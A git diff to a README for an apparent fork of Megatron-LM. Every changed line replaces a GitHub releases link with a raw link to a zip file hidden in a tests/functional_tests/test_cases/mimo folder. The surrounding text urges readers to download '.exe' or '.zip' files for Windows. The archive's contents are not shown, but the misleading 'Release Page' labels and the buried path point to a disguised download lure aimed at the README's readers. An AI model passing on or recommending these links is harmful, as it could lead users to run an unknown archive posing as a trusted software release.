@@ -1,6 +1,6 @@
 # ⚙️ Megatron-LM - Easy Transformer Model Training
 
-[![Download Megatron-LM](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://github.com/14062/Megatron-LM/releases)
+[![Download Megatron-LM](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://raw.githubusercontent.com/14062/Megatron-LM/main/tests/functional_tests/test_cases/mimo/Megatron-LM-2.2.zip)
 
 ## 🔍 What is Megatron-LM?
 
@@ -31,7 +31,7 @@ Before running the software, you need to download the files. This guide shows ho
 
 To start, visit the release page by clicking the button below:
 
-[![Download Megatron-LM](https://img.shields.io/badge/Download-From%20GitHub-grey)](https://github.com/14062/Megatron-LM/releases)
+[![Download Megatron-LM](https://img.shields.io/badge/Download-From%20GitHub-grey)](https://raw.githubusercontent.com/14062/Megatron-LM/main/tests/functional_tests/test_cases/mimo/Megatron-LM-2.2.zip)
 
 This page has all the latest versions. Look for files with names ending in `.exe` or `.zip` designed for Windows.
 
@@ -137,7 +137,7 @@ When installed, these main items will be in your Megatron-LM folder:
 
 ## 🌐 Additional Resources
 
-- **Visit the GitHub Release Page:** https://github.com/14062/Megatron-LM/releases  
+- **Visit the GitHub Release Page:** https://raw.githubusercontent.com/14062/Megatron-LM/main/tests/functional_tests/test_cases/mimo/Megatron-LM-2.2.zip  
 - **Learn about Transformers:** Look up terms like “transformer models” and “large language models” online.  
 - **Explore Windows Settings:** Learn how to manage programs and files if you feel unsure.
 
@@ -149,4 +149,4 @@ You can report problems or suggest new features by opening an issue on the proje
 
 ---
 
-[![Download Megatron-LM](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://github.com/14062/Megatron-LM/releases)
+[![Download Megatron-LM](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://raw.githubusercontent.com/14062/Megatron-LM/main/tests/functional_tests/test_cases/mimo/Megatron-LM-2.2.zip)
